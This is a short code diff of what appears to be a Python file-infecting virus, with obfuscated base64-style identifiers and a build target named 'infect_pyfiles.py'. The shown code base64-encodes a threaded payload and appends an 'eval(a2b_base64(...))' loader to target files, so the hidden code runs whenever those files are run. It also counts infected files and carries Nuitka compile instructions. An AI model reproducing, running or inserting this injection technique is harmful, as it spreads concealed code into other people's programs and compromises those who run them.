@@ -7,13 +7,8 @@ from platform import system
 from re import search
 from base64 import b64encode, b64decode
 from subprocess import run, PIPE
-
 # pip install -U nuitka
-# python3 -m nuitka --follow-imports --standalone MTRkYmNubWx_pyfiles.py
-
-# creating job that runs on startup on Windows
-# https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/
-
+# python3 -m nuitka --follow-imports --standalone infect_pyfiles.py
 class eHhjemR5eXB:
     def __init__(self):
         self.bGpqZ2hjen: str = system()
@@ -39,10 +34,7 @@ class eHhjemR5eXB:
         YWxmanRob += b"\nt.start()"
         YWxmanRob += b"\nt.join()"
         YWxmanRob_base64: bytes = b64encode(YWxmanRob)
-        cXBxZXJjYQ = (
-            "\n"*2 + "from binascii import a2b_base64\n" +
-            "eval(a2b_base64('{}'))\n".format(YWxmanRob_base64.decode())
-        )
+        cXBxZXJjYQ = "\n"*2+"from binascii import a2b_base64\n"+"eval(a2b_base64('{}'))\n".format(YWxmanRob_base64.decode())
         with open(target_file, "a") as f:
             f.write(cXBxZXJjYQ)
         self.ZmFsa2p0aGM += 1
